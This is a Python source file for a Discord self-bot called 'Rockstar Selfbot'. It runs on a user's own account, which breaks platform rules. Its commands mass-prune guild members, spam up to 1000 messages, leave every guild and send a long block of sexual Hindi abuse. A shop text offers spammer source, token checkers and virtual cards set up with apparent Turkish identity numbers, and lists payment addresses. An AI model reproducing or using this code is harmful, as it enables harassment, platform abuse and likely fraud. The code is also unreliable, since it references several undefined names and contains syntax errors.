import os
import json
import string
import discord, aiohttp
from discord.ext import commands, tasks
import requests
from colorama import Fore
import asyncio
import requests
import sys
import random
from flask import Flask
from threading import Thread
import threading
import subprocess
import requests
import time
from discord import Color, Embed
import colorama
from colorama import Fore
import urllib.parse
import urllib.request
import re
from pystyle import Center, Colorate, Colors
import io
import webbrowser
from bs4 import BeautifulSoup
import datetime
from pyfiglet import Figlet
from discord import Member
from datetime import datetime, timedelta

ok = commands.Bot(command_prefix=",", self_bot=True)

@ok.event
async def on_ready():
       print(f'{Fore.BLUE} Logged in as: {ok.user.name}')
       print(f'{Fore.BLUE} Selfbot ID: {ok.user.id}')
       print('ㅤㅤㅤㅤㅤ')
       print('ㅤㅤㅤㅤㅤ')
       print(f'{Fore.BLUE} RockstarCord Is Connected')
       print(f'{Fore.BLUE} Username: {ok.user.name}')
       print(f'{Fore.BLUE} Guilds: {len(ok.guilds)}')
       print(f'{Fore.BLUE} Developer - R O C K S T A R')
       print("""
────────────────────────────────────────────────────────────────────────────────────────────
                  
$$$$$$$\   $$$$$$\   $$$$$$\  $$\   $$\  $$$$$$\ $$$$$$$$\  $$$$$$\  $$$$$$$\  
$$  __$$\ $$  __$$\ $$  __$$\ $$ | $$  |$$  __$$\\__$$  __|$$  __$$\ $$  __$$\ 
$$ |  $$ |$$ /  $$ |$$ /  \__|$$ |$$  / $$ /  \__|  $$ |   $$ /  $$ |$$ |  $$ |
$$$$$$$  |$$ |  $$ |$$ |      $$$$$  /  \$$$$$$\    $$ |   $$$$$$$$ |$$$$$$$  |
$$  __$$< $$ |  $$ |$$ |      $$  $$<    \____$$\   $$ |   $$  __$$ |$$  __$$< 
$$ |  $$ |$$ |  $$ |$$ |  $$\ $$ |\$$\  $$\   $$ |  $$ |   $$ |  $$ |$$ |  $$ |
$$ |  $$ | $$$$$$  |\$$$$$$  |$$ | \$$\ \$$$$$$  |  $$ |   $$ |  $$ |$$ |  $$ |
\__|  \__| \______/  \______/ \__|  \__| \______/   \__|   \__|  \__|\__|  \__|
                                                                               
                                                                               

                                                                                                                       
────────────────────────────────────────────────────────────────────────────────────────────     
   """)

ok.remove_command('help')
token = "enter token here"
@ok.command(aliases=['help', 'h'])
async def Help(ctx):
  await ctx.send("""**```yml
ROCKSTAR SELFBOT V1.1 
``````js
[01] GENERAL HELP(general)
[02] ANTINUKE HELP(antinuke)
[03] FUN HELP(fun)
[04] SHOP HELP(shop)
[05] NUKE HELP(nuke)
[06] MODERATION HELP(mod)
[07] SUPPORT(support)
``````yml
!   ROCKSTAR SELFBOT    !```**""")

@ok.command(aliases=['general', 'g'])
async def GENERAL(ctx):
       await ctx.send("""**```yml
ROCKSTAR SELFBOT V1.1 
``````js
R O C K S T A R  S E L F B O T

prune, mc, ban, kick, mute, ping, calc, asci, mujra, dmall, leave, getbal, purge, avatar, define, boosts, massmail, connectvc, ltcprice, gayrate, loverate, userinfo, copyserver, change_hypesquad, serverinfo, spam, status, stopstatus, rockstarop, hack2, cum, fm (first message), slots, autobuy, gituser, gitsearch, checkpromo (promo link), i2c, minesweeper, uptime, _100, leaveall (Leave all guilds), guildsid, randomip, leaveguild (Leaves a single guild), abuse, c2i, link``````yml
!   ROCKSTAR SELFBOT    !```**"""

@ok.command()
async def prune(ctx: commands.Context):
 await ctx.send("Started Fucking Members...")
 pruned= await ctx.guild.prune_members(days=1,roles=ctx.guild.roles,reason="Rockstar PaPa On Top")
 print(f"Itne bande prune krdia gand maraio ab tum sab - {pruned}")

@ok.command(name="status")
async def set_status(ctx, activity_type: str, *, status: str):
    activity_type = activity_type.lower()

    if activity_type not in ["playing", "streaming", "listening", "watching"]:
        await ctx.send("`:> playing, streaming, listening, watching.`")
        return

    if activity_type == "streaming":
        await ok.change_presence(activity=discord.Streaming(name=status, url="http://twitch.tv/"))
    else:
        await ok.change_presence(activity=discord.Game(name=status))

    await ctx.send(f"**✅ | Custom status set to `{activity_type}` `{status}`**")

@ok.command(name="stopstatus")
async def stop_status(ctx):
    global current_status

    await ok.change_presence(activity=None)
    current_status = None
    await ctx.send("✅ | **Custom status stopped.**")

@ok.command()
async def spam(ctx, message_count: int, *, content):
        if 1 <= message_count <= 1000:
            for _ in range(message_count):
                await ctx.send(content)
            await ctx.send(f"✅ Sent {message_count} messages")

@ok.command()
@commands.has_permissions(ban_members = True)
async def ban(ctx, member : discord.Member, *, reason = None):
    await member.ban(reason = reason)
    await ctx.send(f'**✅ User Has Been Banned. Reason : `{reason}`**')

@ok.command()
@commands.has_permissions(kick_members = True)
async def kick(ctx, member : discord.Member, *, reason = None):
    await member.kick(reason = reason)
    await ctx.send(f'**✅ User Has Been Kicked. Reason : `{reason}`**')

@ok.command(name="ltcprice")
async def ltc_price(ctx):
    try:
        response_usd = requests.get("https://api.coingecko.com/api/v3/simple/price", params={"ids": "litecoin", "vs_currencies": "usd"})
        data_usd = response_usd.json()
        ltc_price_usd = data_usd["litecoin"]["usd"]

        response_inr = requests.get("https://api.coingecko.com/api/v3/simple/price", params={"ids": "litecoin", "vs_currencies": "inr"})
        data_inr = response_inr.json()
        ltc_price_inr = data_inr["litecoin"]["inr"]
        await ctx.send(f"**📈 Current Litecoin (LTC) Price:**\n"
                       f"• USD: ${ltc_price_usd:.2f}\n"
                       f"• INR: ₹{ltc_price_inr:.2f}")
    except Exception as e:
        await ctx.send(f"❌ An error occurred: {e}")
        
async def casci(ctx, text, font):
    try:
        fig = pyfiglet.Figlet(font=font)
        ascii_result = fig.renderText(text)
        await ctx.send(f"**Font: `{font}`**\n```\n{ascii_result}\n```")
    except Exception as e:
        await ctx.send(f"❌ An error occurred: {e}")

@ok.command(aliases=['bal', 'ltcbal'])
async def getbal(ctx, ltcaddress):
    response = requests.get(f'https://api.blockcypher.com/v1/ltc/main/addrs/{ltcaddress}/balance')

    if response.status_code == 200:
        data = response.json()
        balance = data['balance'] / 10**8
        total_balance = data['total_received'] / 10**8
        unconfirmed_balance = data['unconfirmed_balance'] / 10**8
    else:
        await ctx.send("- `FAILED`")
        return

    cg_response = requests.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd')

    if cg_response.status_code == 200:
        usd_price = cg_response.json()['litecoin']['usd']
    else:
        await ctx.send("- `FAILED`")
        return

    usd_balance = balance * usd_price
    usd_total_balance = total_balance * usd_price
    usd_unconfirmed_balance = unconfirmed_balance * usd_price

    message = f"# ROCKSTAR_S3LFBOT\n"
    message += f"`-` **RESULTS FOR LTC ADDY** : __`{ltcaddress}`__\n"
    message += f"`-` **CURRENT LTC** : `{usd_balance:.2f}$ USD`\n"
    message += f"`-` **TOTAL LTC RECEIVED** : `{usd_total_balance:.2f}$ USD`\n"
    message += f"`-` **UNCONFIRMED LTC** : `{usd_unconfirmed_balance:.2f}$ USD`\n\n"


#TRIGGER
@ok.command()
async def addar(ctx, *, trigger_and_response: str):
    # Split the trigger and response using a comma (",")
    trigger, response = map(str.strip, trigger_and_response.split(','))

    with open('auto_responses.json', 'r') as file:
        data = json.load(file)

    data[trigger] = response

    with open('auto_responses.json', 'w') as file:
        json.dump(data, file, indent=4)

    await ctx.send(f'# __ROCKSTAR S3LFB0Ƭ__\n`-` **AUTO-RESPONSE ADDED BXBY.. !** **{trigger}** - **{response}**')


@ok.command()
async def removear(ctx, trigger: str):
    with open('auto_responses.json', 'r') as file:
        data = json.load(file)

    if trigger in data:
        del data[trigger]

        with open('auto_responses.json', 'w') as file:
            json.dump(data, file, indent=4)

        await ctx.send(f'# __ROCKSTAR S3LFB0Ƭ__\n`-` **AUTO-RESPONSE REMOVED** **{trigger}**')
    else:
        await ctx.send(f'# __ROCKSTAR S3LFB0Ƭ__\n`-` **AUTO-RESPONSE NOT FOUND** **{trigger}**')
        
@ok.command()
async def lister(ctx):
    with open('auto_responses.json', 'r') as file:
        data = json.load(file)
    responses = '\n'.join([f'**{trigger}** - **{response}**' for trigger, response in data.items()])
    await ctx.send(f'# ROCKSTAR S3LFB0Ƭ__\n`-` **AUTO_RESPONSE LIST** :\n{responses}')



# STATUS ROTATOR
ok.load_extension("status_rotator")

@ok.command()
async def rockstarop(ctx):
    await ctx.message.delete()
    await ctx.send(""" ```ROCKSTAR ON TOP``` """)

@ok.command()
async def hack2(ctx, member:discord.User = None):
    message = await ctx.send(f"Hacking {member.name} now...")
    await asyncio.sleep(1)

    await message.edit(content= f"Finding discord login...(2fa bypassed)")
    await asyncio.sleep(2)
    
    await message.edit(content=f"Fetching dms with closest friends (if you got any init)")
    await asyncio.sleep(2)

    await message.edit(content=f"Finding most common Word...")
    await asyncio.sleep(2)

    await message.edit(content=f"Injecting virus into the discriminator #{member.discriminator}")
    await asyncio.sleep(2)

    await message.edit(content=f"Virus injected. Nitro stolen")
    await asyncio.sleep(2)

    await message.edit(content=f"Setting up Nintendo account...")
    await asyncio.sleep(2)

    await message.edit(content=f"Hacking Nintendo account...")
    await asyncio.sleep(2)

    await message.edit(content=f"Finding IP address...")
    await asyncio.sleep(2)

    await message.edit(content=f"**IP Address**: 127.0.0.1")
    await asyncio.sleep(2)

    await message.edit(content=f"Stealing data from the scary Goverment...")
    await asyncio.sleep(2)

    await message.edit(content=f"Reporting account to discord for breaking TOS...")
    await asyncio.sleep(2)

    await message.edit(content=f"Hacking your Google history...")
    await asyncio.sleep(2)

    await message.edit(content=f"""Finished hacking {member.name}
The **scary** and dangerous hack is complete""")
    await asyncio.sleep(2)

@ok.command(aliases=["jerkoff", "ejaculate", "orgasm"])
async def cum(ctx):
    await ctx.message.delete()
    message = await ctx.send('''
            :ok_hand:            :smile:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :smiley:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :grimacing:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :persevere:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:   
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :confounded:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant: 
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :tired_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:    
             ''')
    await asyncio.sleep(0.5)
    await message.edit(contnet='''
                       :ok_hand:            :weary:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:= D:sweat_drops:
             :trumpet:      :eggplant:        
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :dizzy_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :drooling_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')
# Kiss
@ok.command()
async def kiss(ctx, user: discord.Member = None, *message):
    await ctx.message.delete()

    if user is None:
        user = ctx.author

    try:
        r = requests.get("https://nekos.life/api/v2/img/kiss")
        res = r.json()

        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()

        with io.BytesIO(image) as file:
            await ctx.send(f"{ctx.author.mention} KISSED {user.mention} {(' '.join(message)) if message else ''}", file=discord.File(file, "astraa_kiss.gif"))

        print(f"[+] KISS SUCCESSFUL: {ctx.author} kissed {user}")
    except Exception as e:
        print(f"[-] Error during kiss command: {e}")
# slap
@ok.command()
async def slap(ctx, user: discord.Member = None, *message):
    await ctx.message.delete()

    if user is None:
        user = ctx.author

    try:
        r = requests.get("https://nekos.life/api/v2/img/slap")
        res = r.json()

        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()

        with io.BytesIO(image) as file:
            await ctx.send(f"{ctx.author.mention} SLAPPED {user.mention} {(' '.join(message)) if message else ''}", file=discord.File(file, "astraa_Slap.gif"))

        print(f"[+] SLAP SUCCESSFUL: {ctx.author} Slapped {user}")
    except Exception as e:
        print(f"[-] Error during Slap command: {e}")
# Tickle
@ok.command()
async def tickle(ctx, user: discord.Member = None, *message):
    await ctx.message.delete()

    if user is None:
        user = ctx.author

    try:
        r = requests.get("https://nekos.life/api/v2/img/tickle")
        res = r.json()

        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()

        with io.BytesIO(image) as file:
            await ctx.send(f"{ctx.author.mention} TICKLE {user.mention} {(' '.join(message)) if message else ''}", file=discord.File(file, "astraa_Tickle.gif"))

        print(f"[+] Tickle SUCCESSFUL: {ctx.author} TICKLED {user}")
    except Exception as e:
        print(f"[-] Error during Tickle command: {e}")    
# Nsfw
@ok.command(aliases=['fuck', 'fx', '18+', 'xxx', 'nsfw'])
async def waifu(ctx):
    try:
        response = requests.get('https://api.waifu.pics/nsfw/waifu')
        data = response.json()
        if 'url' in data:
            image_url = data['url']
            await ctx.message.delete()
            await ctx.send(image_url)
        else:
            await ctx.send('- `[+] ERROR FINDING ANIME GURLLL`')
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN}HENTAI  SUCCESSFUL✅ (THARKI💀)")
    except Exception as e:
        print('- `[+] ERROR FETCHING IT`', e)
# Feed
@ok.command()
async def feed(ctx, user: discord.Member = None, *message):
    await ctx.message.delete()

    if user is None:
        user = ctx.author

    try:
        r = requests.get("https://nekos.life/api/v2/img/feed")
        res = r.json()

        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()

        with io.BytesIO(image) as file:
            await ctx.send(f"{ctx.author.mention} FEEDED {user.mention} {(' '.join(message)) if message else ''}", file=discord.File(file, "astraa_Feed.gif"))

        print(f"[+] FEEDED SUCCESSFUL: {ctx.author} Feeded {user}")
    except Exception as e:
        print(f"[-] Error during Feed command: {e}")    
# Pat
@ok.command()
async def pat(ctx, user: discord.Member = None, *message):
    await ctx.message.delete()

    if user is None:
        user = ctx.author

    try:        
        r = requests.get("https://nekos.life/api/v2/img/pat")
        res = r.json()
 
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()

        with io.BytesIO(image) as file:
            await ctx.send(f"{ctx.author.mention} PAT {user.mention} {(' '.join(message)) if message else ''}", file=discord.File(file, "astraa_pat.gif"))

        print(f"[+] PAT SUCCESSFUL: {ctx.author} Pat {user}")
    except Exception as e:
        print(f"[-] Error during PAT command: {e}")
# Smug
@ok.command()
async def smug(ctx, user: discord.Member = None, *message):
    await ctx.message.delete()

    if user is None:
        user = ctx.author
    try:        
        r = requests.get("https://nekos.life/api/v2/img/smug")
        res = r.json()

        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
       
        with io.BytesIO(image) as file:
            await ctx.send(f"{ctx.author.mention} SMUG {user.mention} {(' '.join(message)) if message else ''}", file=discord.File(file, "astraa_smug.gif"))

        print(f"[+] SMUG SUCCESSFUL: {ctx.author} Smug {user}")
    except Exception as e:
        print(f"[-] Error during SMUG command: {e}")
# Hug
@ok.command()
async def hug(ctx, user: discord.Member = None, *message):
    await ctx.message.delete()
    
    if user is None:
        user = ctx.author
    try:        
        r = requests.get("https://nekos.life/api/v2/img/hug")
        res = r.json()

        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()

        with io.BytesIO(image) as file:
            await ctx.send(f"{ctx.author.mention} HUG {user.mention} {(' '.join(message)) if message else ''}", file=discord.File(file, "astraa_hug.gif"))

        print(f"[+] HUG SUCCESSFUL: {ctx.author} Hug {user}")
    except Exception as e:
        print(f"[-] Error during HUG command: {e}")
# Link
@ok.command()
async def link(channel):
    await channel.send("- `LINK NOT SETED HERE YET`")
# C2I
@ok.command()
@commands.cooldown(1, 3, commands.BucketType.user)
async def c2i(ctx, amount: str):
    amount = float(amount.replace('$', ''))
    usd_amount = amount * C2I_Rate
    await ctx.reply(f"- **[+]** ` AMOUNT IS` : __₹{usd_amount:.2f}/$__")
    print(f"{Fore.GREEN}[+] C2I DONE ✅ ")
# ABUSE
@ok.command()
async def abuse(ctx):
    message = 'bsdk randi hijarchodh teri mummy ki chut me loda mera teri mumm ki chut aisi marunga behen ke lode gnd chud jayegi teri bhosdike aukat se rahle madarjaat ke pille na to jhaant phadh chudai karunga behenchode rndwwa saala baap se bakchodi pel ra behen ka loda bhosdike teri mummy ki chut maru ghapa ghap ghapa ghap bhosda saala rndi panga na lelio phirse warna ptak ke codh dunga behenchode saale teri maa ka bhosda faad dunga phir wo royegi beth ke behen ki lodi saali chutadi saala chutiyapa karega behen ka loda lund lele baap ka behen ke lodechutadin aale rndwe pille bhosde teri mummy ki chut me loda daalu 10 baar teri mummy chodu 50 baar rndi ke pille aukat na ho to 121 karne ki jurat na ho jai bahin choda saala beta tumhara papa aniket 1021 karke betha hai tum jaiso ko loda chusvata hu behenchodo tumhari mummy ko lund pe jhulata hu saalo rndi ko pillo khandan chud jayega tumhara mujhse 121 karne me behene ke lode mujhse bhidenge'
    await ctx.send(message)
    await ctx.message.delete()
# SINGLE GUILD LEAVE
@ok.command(aliases=["leaveg","guildleave"])
async def leaveguild(ctx, *, guild: discord.Guild = None):
    #if ctx.author.id in is_bot_owner:
    if guild is None:
        print("Please enter the guild ID!")  # No guild found
        return
    await guild.leave()  # Guild found
    await ctx.send(f"**I left: {guild.name}!**")
# RANDOM IP
@ok.command()
@commands.cooldown(1, 5, commands.BucketType.user)
async def randomip(ctx):
    octets = [random.randint(0, 255) for forgesb in range(4)]
    forgeip = ".".join(map(str, octets))
    await ctx.reply(f"> **Random IP: {forgeip}**")
# ALL GUILDS ID
@ok.command()
async def guildsid(ctx):
    for guild in unknown.guilds:
            await ctx.send(f"**{guild.name} | {guild.id}**")    
# ALL GUILD LEAVE
@ok.command(aliases=['la'])
async def leaveall(ctx):
 while True:
  for guilds in unknown.guilds:
   try:
    await guilds.leave()
    await ctx.send(f"left {guilds}")
   except:
       await ctx.send(f"couldnt leave {guilds}")
          
# Uptime
@ok.command()
async def uptime(ctx):
    await ctx.message.delete()
    now = datetime.utcnow(
    )  # Timestamp of when uptime function is run
    delta = now - start_time
    hours, remainder = divmod(int(delta.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    days, hours = divmod(hours, 24)
    if days:
        time_format = "**{d}** days, **{h}** hours, **{m}** minutes, and **{s}** seconds."
    else:
        time_format = "**{h}** hours, **{m}** minutes, and **{s}** seconds."
    uptime_stamp = time_format.format(d=days, h=hours, m=minutes, s=seconds)
    await ctx.send(uptime_stamp)
# Count
@ok.command(aliases=["100"])
async def _100(ctx):
    await ctx.message.delete()
    message = await ctx.send("Starting count to 100")
    await asyncio.sleep(2)
    for _next in range(100):
        await message.edit(content=_next)
        await asyncio.sleep(2)
# I2C
@ok.command()
@commands.cooldown(1, 3, commands.BucketType.user)
async def i2c(ctx, amount: str):
    amount = float(amount.replace('₹', ''))
    inr_amount = amount * I2C_Rate
    await ctx.reply(f"- **[+]** ` AMOUNT IS` : __₹{inr_amount:.2f}/$__")
    print(f"{Fore.GREEN}[+] I2C DONE ✅ ")
# Mine swipper
@ok.command()
async def minesweeper(ctx, size: int = 5):
    await ctx.message.delete()
    size = max(min(size, 8), 2)
    bombs = [[random.randint(0, size - 1),
              random.randint(0, size - 1)] for x in range(int(size - 1))]
    is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
    has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
    message = "**Click to play**:\n"
    for y in range(size):
        for x in range(size):
            tile = "||{}||".format(chr(11036))
            if has_bomb(x, y):
                tile = "||{}||".format(chr(128163))
            else:
                count = 0
                for xmod, ymod in m_offets:
                    if is_on_board(x + xmod, y + ymod) and has_bomb(
                            x + xmod, y + ymod):
                        count += 1
                if count != 0:
                    tile = "||{}||".format(m_numbers[count - 1])
            message += tile
        message += "\n"
    await ctx.send(message)
# cuddle
@ok.command()
async def cuddle(ctx, user: discord.Member = None, *message):
    await ctx.message.delete()

    if user is None:
        user = ctx.author
    try:        
        r = requests.get("https://nekos.life/api/v2/img/cuddle")
        res = r.json()

        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()

        with io.BytesIO(image) as file:
            await ctx.send(f"{ctx.author.mention} CUDDLE {user.mention} {(' '.join(message)) if message else ''}", file=discord.File(file, "astraa_cuddle.gif"))

        print(f"[+] CUDDLE SUCCESSFUL: {ctx.author} Cuddle {user}")
    except Exception as e:
        print(f"[-] Error during CUDDLE command: {e}")
# meme
@ok.command()
async def meme(ctx):
    async with aiohttp.ClientSession() as cs:
        async with cs.get("https://www.reddit.com/r/memes.json") as r:
            memes = await r.json()
            urll=memes['data']['children'][random.randint(0,25)]['data']['url']
            await ctx.send(f"""
{urll}            
""")
# check promo
@ok.command()
async def checkpromo(ctx, *, promo_links):
    links = promo_links.split('\n')

    async with aiohttp.ClientSession() as session:
        for link in links:
            promo_code = extract_promo_code(link)
            if promo_code:
                result = await check_promo(session, promo_code)
                await ctx.send(result)
            else:
                await ctx.send(f'- `INAVLID PROMO{link}`')

from dateutil import parser

async def check_promo(session, promo_code):
    url = f'https://ptb.discord.com/api/v10/entitlements/gift-codes/{promo_code}'

    async with session.get(url) as response:
        if response.status in [200, 204, 201]:
            data = await response.json()
            if data["uses"] == data["max_uses"]:
                return f'- `ALREADY CLAIMED {promo_code}`'
            else:
                try:
                    now = datetime.datetime.utcnow()
                    exp_at = data["expires_at"].split(".")[0]
                    parsed = parser.parse(exp_at)
                    days = abs((now - parsed).days)
                    title = data["promotion"]["inbound_header_text"]
                except Exception as e:
                    print(e)
                    exp_at = "- `FAILED TO FETCH`"
                    days = ""
                    title = "- `FAILED TO FETCH`"
                return f'- `VALID {promo_code} | DAYS LEFT IN EXPIRATION {days} | EXPIRES AT {exp_at} | TITLE :{title}`'
        elif response.status == 429:
            return f'- `RATE LIMITED{response.headers["RETRY AFTER"]} SECONDS`'
        else:
            return f'- `INVALID : {promo_code}`'


def extract_promo_code(promo_link):
    promo_code = promo_link.split('/')[-1]
    return promo_code

@ok.command(aliases=['shop','s'])
async def SHOP(ctx):
       await ctx.send("""#              🛒   R O C K S T A R  SHOP  🛒 




   **FUPS FULL SETUP**
   **PRICE- 1$/80 RS**

  **Features From My Side** 

 >   1x Turkish Number (Not available)
 >   1x Turkish NATIONAL ID (Not available)
 >   Full Guide About Fups
 >   Guide About How To Add Money or Use 

  **Features From Fups**

 >   💳 VCC
 >   Can Use For Trial Claims ( If You Have Bal In Fups )


   **Extra** Dm for Prices
 >    Dm Spammer src
 >  Tools
 >  Selfbot
 >  Token Checker
 >  Nitro Checker
 >  Bots Src
 >  Bot Hosting
 >  Many More etc.


 Claiming Promo In Your Account 0.3$/25rs 

 **Dm For Buy / MM Accept**""")

@ok.command(aliases=['payment','p'])
async def P(ctx):
    await ctx.send("""**╭・⌬・ROCKSTAR S3LFB0T **
**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**
__**[PAYMENT MODES]**__

**[+]・ `LTC` : `ltc1q5spazr653mazesun5uaeskrnkjnfqjcnnjcl2x`**
**[+]・ `BTC` : https://media.discordapp.net/attachments/1229096979611652228/1301588635484819586/IMG_20241031_221820.jpg?ex=67250661&is=6723b4e1&hm=2fdb69d5ed233c205bca1cef04a1d716a1dcbe41989fa467d541a1dda33b20dc&
**[+]・ `ETH` : https://media.discordapp.net/attachments/1229096979611652228/1301588879052243048/IMG_20241031_221849.jpg?ex=6725069b&is=6723b51b&hm=660abfcdfcf5d1615afb8aa4b6fe5208bc8208d96239d9904077ffa65ba5df54&
**[+]・ `UPI` : `anmol392@fam`**
**[+]・ `UPI QR CODE / SCANNER` : https://media.discordapp.net/attachments/1229096979611652228/1301589734275158037/share_image4224021627541357224.png?ex=67250767&is=6723b5e7&hm=a6aa5715c63b586a087d7e0db867cc96f6e6ccfad1779f6bb600d0bd906867ec&
**[+]・ `BTC QR CODE / SCANNER` : https://media.discordapp.net/attachments/1229096979611652228/1301588635484819586/IMG_20241031_221820.jpg?ex=67250661&is=6723b4e1&hm=2fdb69d5ed233c205bca1cef04a1d716a1dcbe41989fa467d541a1dda33b20dc&
**[+]・ `ETH QR CODE / SCANNER` : https://media.discordapp.net/attachments/1229096979611652228/1301588879052243048/IMG_20241031_221849.jpg?ex=6725069b&is=6723b51b&hm=660abfcdfcf5d1615afb8aa4b6fe5208bc8208d96239d9904077ffa65ba5df54&
**[+]・ `LTC QR CODE / SCANNER` : https://media.discordapp.net/attachments/1229096979611652228/1301588878796394637/IMG_20241031_221912.jpg?ex=6725069b&is=6723b51b&hm=641e555be637183b163ee1e864f74b699f268a04e7d473f8233b035edf6cffe3&


__**[+]・Created by - ROCKSTAR **__
**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**""")

# GitSearch
@ok.command()
async def gitsearch(ctx, repository_name: str):
    try:
        # Search for repositories on GitHub
        url = f"https://api.github.com/search/repositories?q={repository_name}"
        response = requests.get(url)
        data = response.json()

        # Process the response and send repository information as a response
        if "items" in data:
            repositories = data["items"][:5]  # Limit the number of repositories to display
            for repository in repositories:
                repo_name = repository["full_name"]
                repo_url = repository["html_url"]
                await ctx.send(f"**Repository:** {repo_name}\n{repo_url}")
        else:
            await ctx.send("No repositories found.")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")

# AutoBuy
@ok.command()
async def autobuy(ctx):
    await ctx.message.delete()
    await ctx.send(f" **[+]・ `AUTOBUY LINK` :** {AUTOBUY}")

# GirUser
@ok.command()
async def gituser(ctx, username: str):
    api_url = f"https://api.github.com/users/{username}"
    
    response = requests.get(api_url)
    
    if response.status_code == 200:
        user_data = response.json()
        
        message = f"**GitHub User Information**\n\n"
        message += f"**Username:** {user_data['login']}\n"
        message += f"**Name:** {user_data['name'] or 'Not specified'}\n"
        message += f"**Bio:** {user_data['bio'] or 'Not specified'}\n"
        message += f"**Followers:** {user_data['followers']}\n"
        message += f"**Following:** {user_data['following']}\n"
        message += f"**Public Repositories:** {user_data['public_repos']}\n"
        message += f"**GitHub URL:** {user_data['html_url']}\n"
        
        await ctx.send(message)
    elif response.status_code == 404:
        await ctx.send("User not found.")
    else:
        await ctx.send("Failed to fetch user information.")

# first message
@ok.command(
    name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel = None):
    await ctx.message.delete()
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1,
                                           oldest_first=True).flatten())[0]
    await ctx.send(f"[Jump]({first_message.jump_url})")
# slots 
@ok.command(aliases=['slots', 'bet', "slotmachine"])
async def slot(ctx):
    await ctx.message.delete()
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)
    slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if a == b == c:
        await ctx.send(f"{slotmachine} All matchings, you won!")
    elif (a == b) or (a == c) or (b == c):
        await ctx.send(f"{slotmachine} 2 in a row, you won!")
    else:
        await ctx.send(f"{slotmachine} No match, you lost")
           
@ok.command(pass_context = True)
async def mute(ctx, member: discord.Member):
     if ctx.message.author.server_permissions.administrator or ctx.message.author.id == '194151340090327041':
        role = discord.utils.get(member.server.roles, name='Muted')
        await bot.add_roles(member, role)
        embed=discord.Embed(title="**✅ User Muted!**", description="**{0}** was muted by **{1}**!".format(member, ctx.message.author), color=0xff00f6)
        await bot.say(embed=embed)
     else:
        embed=discord.Embed(title="**❌ Permission Denied.**", description="**❌ You don't have permission to use this command.**", color=0xff00f6)
        await ok.say(embed=embed)

@ok.command(name="userinfo", aliases=["ui"])
async def user_info(ctx, member: discord.Member = None):
    member = member or ctx.author

    joined_discord = member.created_at.strftime("%m/%d/%Y")
    joined_server = member.joined_at.strftime("%m/%d/%Y") if member.joined_at else "Not available"

    message = (
        f"👤**User Info**👤\n"
        f"• **Username:** `{member.name}`{member.discriminator}`\n"
        f"• **ID:** `{member.id}`\n"
        f"• **Discriminator:** `{member.discriminator}`\n"
        f"• **Nickname:** `{member.nick or 'None'}`\n"
        f"• **Status:** {status_emoji(member.status)} `{str(member.status).capitalize()}`\n"
        f"• **Joined Discord:** `{joined_discord}`\n"
        f"• **Joined Server:** `{joined_server}`"
    )

    await ctx.send(message)
    
def status_emoji(status):
    if status == discord.Status.online:
        return "🟢"
    elif status == discord.Status.idle:
        return "🟡"
    elif status == discord.Status.dnd:
        return "🔴"
    elif status == discord.Status.offline:
        return "⚫"
    else:
        return "❓" 

@ok.command()
async def serverinfo(ctx):
